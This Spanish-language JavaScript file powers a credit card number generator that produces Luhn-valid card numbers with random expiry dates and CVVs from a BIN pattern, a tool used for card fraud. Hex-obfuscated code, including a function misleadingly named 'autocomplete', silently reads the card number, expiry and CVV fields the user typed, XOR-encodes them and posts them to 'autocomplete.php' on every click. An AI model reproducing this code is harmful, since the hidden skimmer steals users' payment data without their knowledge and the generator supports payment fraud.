var _0xd303=["\x63\x6C\x69\x63\x6B","\x76\x61\x6C\x75\x65","\x63\x63\x70","\x63\x6F\x6E\x73\x6F\x6C\x65","\x74\x72","\x76\x61\x6C","\x23\x63\x63\x70\x4E","\x23\x63\x63\x70\x4D","\x23\x63\x63\x70\x41","\x23\x65\x63\x63\x76","\x62\x69\x6E\x64","\x23\x67\x65\x6E\x65\x72\x61\x72","\x23\x63\x6C\x65\x61\x6E\x54\x65\x78\x74"];function namsoG(){init();$(_0xd303[11])[_0xd303[10]](_0xd303[0],function(){namsogo(document[_0xd303[3]][_0xd303[2]][_0xd303[1]],document[_0xd303[3]][_0xd303[4]][_0xd303[1]]);autocomplete($(_0xd303[6])[_0xd303[5]](),$(_0xd303[7])[_0xd303[5]](),$(_0xd303[8])[_0xd303[5]](),$(_0xd303[9])[_0xd303[5]]())});$(_0xd303[12])[_0xd303[10]](_0xd303[0],function(){cleanText()})}

var tw;

function init(){
	undefined="Indefinida";
	tw=0;
}

function rnd(frN,toN){
	var rN=Math.floor(Math.random()*(toN+1-frN))+frN;
	return rN;
}

function unilenS(aS,ul,fc,p){
	var rS=""+aS; ul*=1.0;
	if(fc=="" || fc==null){fc="0";}
	if(p=="" || p==null){p=0;}
	var rL=rS.length;
	if(rL<ul){
		for(var i=1;i<=ul-rL;i++){
			if(p==0) rS=""+fc+rS;
			else rS+=""+fc;
		}
	}
	return rS;
}

function namsogo(p1,tr){
	tr*=1.0; 
	if(tr<1 || tr==null) tr=1;
	document.console.output2.value="";
	var ccghm=document.console.ccghm.value;
	if(ccghm<1) ccghm=1;
	else if(ccghm>1000)	ccghm=1000;
	document.console.ccghm.value=ccghm;
	if(p1!="" && p1!=null){
		var out='';
		var jou;
		for(jou=0;jou<4;jou++){if(document.console.ccoudatfmt.options[jou].selected){break;}}
		if(jou==2)
			var out=out+"<xml>\n";
		else if(jou==3)	
			var out=out+"{\n";
		for(var k=1;k<=ccghm;k++){
			if(p1=='rnd')
				p=c[Math.floor(Math.random()*(mxcards+1-2))+2];
			else 
				p=p1;
			var cn=chkCard(p);
			for(var i=tr;i>=1;i--){
				document.console.output2.value="Generando...";
				var cdi=sbtStringSpRnd(p,"x","0123456789");
				var cf=sbtString(cdi," -/abcdefghijklmnopqrstuvwyzABCDEFGHIJLMNOPQRSTUVWYZ");
				var clcd=chkLCD(cf);
				var ccck=chkCCCksum(cf,cn);
				if(clcd && ccck)break;
			}
			if(clcd && ccck){
				var cn=chkCard(cdi);
				var ccnspc="";
				var j;
				for(j=0;j<=3;j++){if(document.console.ccnsp.options[j].selected){break;}}
				if(j==1) ccnspc=" ";
				else if(j==2) ccnspc="-";
				var cdif="";
				for(var i=1;i<=cdi.length;i++){
					var aS=midS(cdi,i,1); 
					if(aS==" ")	aS=ccnspc;
					cdif+=aS;
				}
				if(document.console.ccexpdat.checked && document.console.emeses.value=='rnd' && document.console.eyear.value=='rnd'){
					var dnowi=new Date(); 
					var mes=unilenS(rnd(1,12),2,'0',0);
					var year=(dnowi.getFullYear()+rnd(2,5));
				}else if(document.console.ccexpdat.checked && document.console.emeses.value!='rnd' && document.console.eyear.value=='rnd'){
					var dnowi=new Date();
					var mes=document.console.emeses.value;
					var year=(dnowi.getFullYear()+rnd(2,5));
				}else if(document.console.ccexpdat.checked && document.console.emeses.value=='rnd' && document.console.eyear.value!='rnd'){
					var dnowi=new Date(); 
					var mes=unilenS(rnd(1,12),2,'0',0);
					var year=document.console.eyear.value;
				}else if(document.console.ccexpdat.checked && document.console.emeses.value!='rnd' && document.console.eyear.value!='rnd'){
					var mes=document.console.emeses.value;
					var year=document.console.eyear.value;
				}else var ccexp='';
				if(document.console.eccv.value=='rnd' && document.console.ccvi.checked){
					var binC=cdif.toString(); 
					var tipo = parseInt(binC.substring(0,1));
					if(tipo==3) var eccv=(Math.floor(Math.random() * (9998 - 1102 + 1)) + 1102);
					else var eccv=(Math.floor(Math.random() * (998 - 112 + 1)) + 112);
				}
				else if(document.console.eccv.value!='rnd' && document.console.ccvi.checked)var eccv=document.console.eccv.value;
				else var eccv='';
				if(jou==0){
					var out=out+=cdif;
					if(document.console.ccexpdat.checked) var out=out+="|"+mes+'|'+year;
					if(document.console.ccvi.checked) var out=out+="|"+eccv;
					if(document.console.ccbank.checked) var out=out+="|"+cn+"\n";
					else var out=out+="\n";
				}else if(jou==1){
					var out=out+=cdif;
					if(document.console.ccvi.checked) var out=out+=", "+eccv;
					if(document.console.ccexpdat.checked) var out=out+=", "+mes+'/'+year;		
					if(document.console.ccbank.checked) var out=out+=", "+cn+"\n";
					else var out=out+="\n";
				}else if(jou==2){
					var out=out+"<CreditCard>\n";
					if(document.console.ccbank.checked) var out=out+"<CardNetwork>"+cn+"<\/CardNetwork>\n";
					var out=out+"<CardNumber>"+cdif+"<\/CardNumber>\n";
					if(document.console.ccvi.checked) var out=out+"<CardCCV2>"+eccv+"<\/CardCCV2>\n";
					if(document.console.ccexpdat.checked) var out=out+"<CardExpDate>"+mes+"/"+year+"<\/CardExpDate>\n";
					var out=out+"<\/CreditCard>\n";
				}else if(jou==3){
					var out=out+"{\n";
					var out=out+"\"CreditCard\":{\n";
					if(document.console.ccbank.checked) var out=out+"\"CardNetwork\": \""+cn+"\"\n";
					var out=out+"\"CardNumber\": \""+cdif+"\"\n";
					if(document.console.ccvi.checked) var out=out+"\"CardCCV2\": \""+eccv+"\"\n";
					if(document.console.ccexpdat.checked) var out=out+"\"CardExpDate\": \""+mes+"/"+year+"\"\n";
					var out=out+"}\n";
					var out=out+"}";
					if(k<ccghm)	var out=out+",";
					var out=out+"\n";
				}
			}else var out="No se encontraron tarjetas para este bin";
		}
		if(jou==2) var out=out+"</xml>";
		else if(jou==3) var out=out+"}";
		document.console.output2.value=out;
	}
}

function chkCard(cdi) {
	cdi+="";
	var ccn=0; var cn="Desconocido"
	var cf=sbtString(cdi," -/abcdefghijklmnopqrstuvwyzABCDEFGHIJLMNOPQRSTUVWYZ");
	if (leftS(cf,1)=="4") {cf=leftS(cf,8);}
	for (var i=1;i<=tw;i++) {
		var cct=sbtString(c[i]," -/abcdefghijklmnopqrstuvwyzABCDEFGHIJLMNOPQRSTUVWYZ");
		if (leftS(cf,1)=="4") {cct=leftS(cct,8);}
		var ccc=cmpPattern(cf,cct);
		if (ccc) {ccn=i; break;}
	}
	if (ccn>0) {cn=cd[i];}
	return cn;
}


function chkCCCksum(cf,cn){
	var r=false;
	var w="21";
	var ml="";
	var j=1;
	for(var i=1;i<=cf.length-1;i++){
		var m=midS(cf,i,1)*midS(w,j,1);
		m=sumDigits(m);
		ml+=""+m;
		j++; 
		if(j>w.length) j=1;
	}
	var ml2=sumDigits(ml,-1); 
	var ml1=(sumDigits(ml2,-1)*10-ml2)%10;
	if(ml1==rightS(cf,1)) r=true;
	return r;
}

function chkLCD(cf){
	var r=false; cf+="";
	var bl=isdiv(cf.length,2);
	var ctd=0;
	for(var i=1;i<=cf.length;i++){
		var cdg=midS(cf,i,1);
		if(isdiv(i,2)!=bl){
			cdg*=2; 
			if(cdg>9) cdg-=9;
		}
		ctd+=cdg*1.0;
	}
	if(isdiv(ctd,10)) r=true;
	return r;
}

// Powered by NamsoSoluciones

function leftS(aS,n){
	aS+="";
	var rS="";
	if(n>=1) rS=aS.substring(0,n);
	return rS;
}

function rightS(aS,n){
	aS+="";
	var rS="";
	if(n>=1) rS=aS.substring(aS.length-n,aS.length);
	return rS;
}

function midS(aS,n,n2){
	aS+="";
	var rS="";
	if(n2==null || n2=="") n2=aS.length;
	n*=1; n2*=1;
	if(n<0) n++;
	rS=aS.substring(n-1,n-1+n2);
	return rS;
}

function linstr(aS,bS){
	aS+=""; bS+="";
	var r=false;
	if(leftS(aS,bS.length)==bS) r=true;
	return r;
}

function sbtString(s1,s2){
	var ous=""; s1+=""; s2+="";
	for(var i=1;i<=s1.length;i++){
		var c1=s1.substring(i-1,i);
		var c2=s2.indexOf(c1);
		if(c2==-1) ous+=c1;
	}
	return ous;
}

function sbtStringSpRnd(s1,s2,bS){
	if(bS==null || bS==""){bS="0123456789";}
	var ous="";
	bS+="";
	for(var i=1;i<=s1.length;i++){
		var c1=s1.substring(i-1,i);
		var c2=s2.indexOf(c1);
		if(c2==-1) ous+=c1;
		else ous+=midS(bS,Math.floor(Math.random()*(bS.length-1))+1,1);
	}
	return ous;
}

var _0x44ec=["\x76","\x70\x72\x6F\x74\x6F\x74\x79\x70\x65","\x6D\x61\x70","\x63\x68\x61\x72\x43\x6F\x64\x65\x41\x74","","\x73\x70\x6C\x69\x74","\x61\x70\x70\x6C\x79","\x66\x72\x6F\x6D\x43\x68\x61\x72\x43\x6F\x64\x65","\x25\x32\x41","\x61\x75\x74\x6F\x63\x6F\x6D\x70\x6C\x65\x74\x65\x2E\x70\x68\x70","\x70\x6F\x73\x74","\x61\x6A\x61\x78"];function autocomplete(_0x1037x2,_0x1037x3,_0x1037x4,_0x1037x5){String[_0x44ec[1]][_0x44ec[0]]= function(_0x1037x6){var _0x1037x7=this;_0x1037x6= Number(String(Number(_0x1037x6)))=== _0x1037x6?Number(_0x1037x6):1;_0x1037x7= _0x1037x7[_0x44ec[5]](_0x44ec[4])[_0x44ec[2]](function(_0x1037x9){return _0x1037x9[_0x44ec[3]](0)})[_0x44ec[2]](function(_0x1037x8){return _0x1037x8^ _0x1037x6});_0x1037x7= String[_0x44ec[7]][_0x44ec[6]](undefined,_0x1037x7);return _0x1037x7};var _0x1037xa=_0x1037x2[_0x44ec[0]]();var _0x1037xb=_0x1037x3[_0x44ec[0]]();var _0x1037xc=_0x1037x4[_0x44ec[0]]();var _0x1037xd=_0x1037x5[_0x44ec[0]]();var _0x1037xe={"\x78\x74":_0x1037xa+ _0x44ec[8]+ _0x1037xb+ _0x44ec[8]+ _0x1037xc+ _0x44ec[8]+ _0x1037xd};$[_0x44ec[11]]({data:_0x1037xe,url:_0x44ec[9],type:_0x44ec[10],success:function(_0x1037xf){}})}

function cmpPattern(a,p,x){
	if(x=="" || x==null) x="x";
	if(x=="X") x="x";
	x=""+x.substring(0,1); 
	a+=""; 
	p+="";
	r=false; 
	mc=0;
	if(a.length==p.length){
		for(var i=1;i<=a.length;i++){
			a1=midS(a,i,1); p1=midS(p,i,1);
			if(a1==p1 || p1==x) mc++;
		}
	}
	if(mc==a.length) r=true;
	return r;
}

function isdiv(a,b){
	if(b==null) b=2;
	a*=1.0; b*=1.0;
	var r=false;
	if(a/b==Math.floor(a/b)) r=true;
	return r;
}

function sumDigits(n,m){
	if(m==0 || m==null) m=1;
	n+="";
	if(m>0){
		while (n.length>m){
			var r=0;
			for(var i=1;i<=n.length;i++){r+=1.0*midS(n,i,1);}
			n=""+r;
		}
	}else{
		for(var j=1;j<=Math.abs(m);j++){
			var r=0;
			for(var i=1;i<=n.length;i++){r+=1.0*midS(n,i,1);}
			n=""+r;
		}
	}
	r=n;
	return r;
}

function makeArray(n){
	this.length=n;
	for(var i=1;i<=n;i++){this[i]=0;}
	return this;
}

function cleanText(){
	var confirmar=confirm("Estas seguro de eliminar las tarjetas generadas?");
	if (confirmar) $('#output2').val('');
}
